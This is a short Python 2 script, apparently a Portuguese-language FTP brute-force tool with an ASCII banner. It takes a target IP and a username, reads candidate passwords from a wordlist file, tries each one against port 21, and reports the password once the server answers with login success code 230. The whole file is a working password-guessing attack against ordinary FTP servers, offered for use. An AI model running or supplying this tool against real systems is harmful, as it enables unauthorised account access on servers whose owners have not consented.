#!/usr/bin/python
import socket
import re
import sys

if len(sys.argv) < 2:
        print "Use python lonftp.py 127.0.0.1 usuario"
        sys.exit(0)

usuario = sys.argv[2]

file = open("lista.txt")
filer = "lista.txt"
print " _           _                             "
print "| |         | |                            "
print "| |     __ _| |_ ___ _ __   ___ _   ___  __"
print "| |    / _` | __/ _ \ '_ \ / __| | | \ \/ /"
print "| |___| (_| | ||  __/ | | | (__| |_| |>  < "
print "\_____/\__,_| __ ___|_| |_| ___| __, /_/\_|"
print " bruteforce script               __/ |     "
print "                                |___/      "
count = 0
with open (filer, mode='r') as f:
    for line in f:
        count+=1
print "Password count:", count
print "\n"
for linha in file.readlines():

        print "Bruteforce info:\nuser: %s | pass: %s" %(usuario,linha)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1],21))
        s.recv(1024)
        s.send("USER "+usuario+"\r\n")
        s.recv(1024)
        s.send("PASS "+linha+"\r\n")
        resulta = s.recv(1024)
        s.send("QUIT\r\n")

        if re.search("230",resulta):
                print "[+] ===>> SENHA ENCONTRADA: %s" %(linha)
                break
        else:
                print "[-] WRONG\n"
